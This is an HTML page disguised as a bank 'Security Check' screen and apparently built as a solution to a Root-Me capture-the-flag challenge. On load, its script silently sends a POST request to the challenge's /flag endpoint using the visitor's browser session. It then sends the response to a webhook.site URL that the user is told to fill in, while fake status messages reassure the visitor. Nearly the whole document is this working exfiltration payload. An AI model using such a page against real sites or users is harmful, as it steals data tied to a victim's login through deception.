<!DOCTYPE html>
<html>
<head>
    <title>Bank Security Verification</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
        .container { background: white; padding: 30px; border-radius: 10px; margin: 0 auto; max-width: 500px; }
        .loading { color: green; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Security Check</h1>
        <div class="loading" id="status">Initializing verification...</div>
    </div>

    <script>
        function post(url, params={}){
            var params_post = [];
            for(const key in params){
                params_post.push(`${key}=${params[key]}`);
            }
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, false);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send(params_post.join("&"));
            return xhr.responseText;
        }

        setTimeout(function() {
            try {
                document.getElementById('status').textContent = "Checking permissions...";
                var flag = post("https://bankme-1.challenges.pro.root-me.org/flag");
                document.getElementById('status').textContent = "Sending verification...";
                
                // ⚠️ REEMPLAZA ESTA URL CON TU WEBHOOK ⚠️
                var webhook = "https://webhook.site/TU-CODIGO-AQUI";
                var img = new Image();
                img.src = webhook + "?flag=" + encodeURIComponent(flag);
                
                document.getElementById('status').textContent = "Verification complete!";
            } catch(e) {}
        }, 1000);
    </script>
</body>
</html>
